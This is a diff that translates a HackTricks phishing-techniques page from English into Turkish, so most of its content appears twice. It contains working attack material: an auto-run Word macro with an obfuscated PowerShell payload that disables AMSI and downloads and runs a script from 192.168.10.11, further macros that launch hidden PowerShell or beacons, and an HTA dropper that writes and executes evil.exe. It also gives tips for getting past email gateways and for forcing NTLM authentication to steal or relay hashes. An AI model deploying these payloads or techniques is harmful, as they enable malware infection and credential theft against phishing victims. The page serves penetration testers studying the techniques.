@@ -1,65 +1,62 @@
-# Phishing Files & Documents
+# Phishing Dosyaları ve Belgeleri
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
 
 </details>
 
-## Office Documents
+## Ofis Belgeleri
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlama şeklinde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+Genellikle makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve hala makro yürütme yeteneklerini korumak mümkündür.\
+Örneğin, RTF dosyası, tasarım gereği makroları desteklemez, ancak RTF olarak adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve makro yürütme yeteneklerine sahip olacaktır.\
+Aynı iç yapı ve mekanizmalar, Microsoft Office Suite'in diğer yazılımlarında da geçerlidir (Excel, PowerPoint vb.).
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
-
+Aşağıdaki komutu kullanarak, bazı Office programları tarafından yürütülecek uzantıları kontrol edebilirsiniz:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
+DOCX dosyaları, makrolar içeren uzaktan bir şablona (Dosya - Seçenekler - Eklentiler - Yönet: Şablonlar - Git) referans vererek makroları "çalıştırabilir".
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+### Harici Resim Yükleme
 
-### External Image Load
-
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+Git: _Ekle --> Hızlı Parçalar --> Alan_\
+_**Kategoriler**: Bağlantılar ve Referanslar, **Alan Adları**: includePicture ve **Dosya Adı veya URL**:_ http://\<ip>/herhangi_birşey
 
 ![](<../../.gitbook/assets/image (316).png>)
 
-### Macros Backdoor
+### Makrolar Arka Kapı
 
-It's possible to use macros to run arbitrary code from the document.
+Belgeden keyfi kod çalıştırmak için makroları kullanmak mümkündür.
 
-#### Autoload functions
+#### Otomatik Yükleme Fonksiyonları
 
-The more common they are, the more probable the AV will detect them.
+Ne kadar yaygın olurlarsa, AV tarafından tespit edilme olasılıkları o kadar yüksek olur.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Macros Code Examples
-
+#### Makro Kodu Örnekleri
 ```vba
 Sub AutoOpen()
-    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
+CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
 End Sub
 ```
 
 ```vba
 Sub AutoOpen()
 
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-  Shell.Run "calc"
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "calc"
 
 End Sub
 ```
@@ -68,8 +65,8 @@ End Sub
 Dim author As String
 author = oWB.BuiltinDocumentProperties("Author")
 With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
- .StdIn.WriteLine author
- .StdIn.WriteBlackLines 1
+.StdIn.WriteLine author
+.StdIn.WriteBlackLines 1
 ```
 
 ```vba
@@ -77,88 +74,85 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
+#### Meta verileri manuel olarak kaldırma
 
-#### Manually remove metadata
+**Dosya > Bilgi > Belgeyi İncele > Belgeyi İncele** yolunu izleyin, bu Belge Denetleyicisini açacaktır. **İncele**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler** yanındaki **Tümünü Kaldır**'a tıklayın.
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+#### Doc Uzantısı
 
-#### Doc Extension
+Tamamlandığında, **Farklı Kaydet** açılır menüsünden **.docx** formatını **Word 97-2003 `.doc`** olarak değiştirin.\
+Bunu yapmanızın nedeni, **makroları `.docx` içine kaydedememeniz** ve makro destekli **`.docm`** uzantısının bir **stigmaya** sahip olmasıdır (örneğin, küçük resim simgesinde büyük bir `!` işareti bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
-
-#### Malicious Macros Generators
+#### Zararlı Makro Oluşturucuları
 
 * MacOS
-  * [**macphish**](https://github.com/cldrn/macphish)
-  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
+* [**macphish**](https://github.com/cldrn/macphish)
+* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## HTA Dosyaları
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+Bir HTA, HTML ve VBScript ve JScript gibi betik dillerini birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tamamen güvenilir" bir uygulama olarak çalışır.
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
-
+Bir HTA, genellikle **Internet Explorer** ile birlikte **kurulan** **`mshta.exe`** kullanılarak çalıştırılır, bu nedenle **`mshta` IE'ye bağımlıdır**. Bu nedenle, IE kaldırıldıysa, HTA'lar çalıştırılamaz.
 ```html
 <--! Basic HTA Execution -->
 <html>
-  <head>
-    <title>Hello World</title>
-  </head>
-  <body>
-    <h2>Hello World</h2>
-    <p>This is an HTA...</p>
-  </body>
+<head>
+<title>Hello World</title>
+</head>
+<body>
+<h2>Hello World</h2>
+<p>This is an HTA...</p>
+</body>
 
-  <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
-    End Function
+<script language="VBScript">
+Function Pwn()
+Set shell = CreateObject("wscript.Shell")
+shell.run "calc"
+End Function
 
-    Pwn
-  </script>
+Pwn
+</script>
 </html>
 ```
 
 ```html
 <--! Cobal Strike generated HTA without shellcode -->
 <script language="VBScript">
-	Function var_func()
-		var_shellcode = "<shellcode>"
+Function var_func()
+var_shellcode = "<shellcode>"
 
-		Dim var_obj
-		Set var_obj = CreateObject("Scripting.FileSystemObject")
-		Dim var_stream
-		Dim var_tempdir
-		Dim var_tempexe
-		Dim var_basedir
-		Set var_tempdir = var_obj.GetSpecialFolder(2)
-		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
-		var_obj.CreateFolder(var_basedir)
-		var_tempexe = var_basedir & "\" & "evil.exe"
-		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
-		For i = 1 to Len(var_shellcode) Step 2
-		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
-		Next
-		var_stream.Close
-		Dim var_shell
-		Set var_shell = CreateObject("Wscript.Shell")
-		var_shell.run var_tempexe, 0, true
-		var_obj.DeleteFile(var_tempexe)
-		var_obj.DeleteFolder(var_basedir)
-	End Function
+Dim var_obj
+Set var_obj = CreateObject("Scripting.FileSystemObject")
+Dim var_stream
+Dim var_tempdir
+Dim var_tempexe
+Dim var_basedir
+Set var_tempdir = var_obj.GetSpecialFolder(2)
+var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+var_obj.CreateFolder(var_basedir)
+var_tempexe = var_basedir & "\" & "evil.exe"
+Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+For i = 1 to Len(var_shellcode) Step 2
+var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
+Next
+var_stream.Close
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run var_tempexe, 0, true
+var_obj.DeleteFile(var_tempexe)
+var_obj.DeleteFolder(var_basedir)
+End Function
 
-	var_func
-	self.close
+var_func
+self.close
 </script>
 ```
+## NTLM Kimlik Doğrulamasını Zorlama
 
-## Forcing NTLM Authentication
+**NTLM kimlik doğrulamasını "uzaktan" zorlamak için** birkaç yol vardır, örneğin, kullanıcıya erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM ile?). Veya kurbanı, yalnızca **klasörü açmak için** bir **kimlik doğrulaması tetikleyecek** dosyaların adresini gönderebilirsiniz.
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
-
-**Check these ideas and more in the following pages:**
+**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -168,21 +162,21 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 [places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
 {% endcontent-ref %}
 
-### NTLM Relay
+### NTLM Aktarımı
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+Unutmayın, sadece hash'i veya kimlik doğrulamasını çalmakla kalmaz, aynı zamanda **NTLM aktarım saldırıları** da gerçekleştirebilirsiniz:
 
-* [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**NTLM Aktarım Saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (Sertifikalara NTLM aktarımı)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
 
 </details>
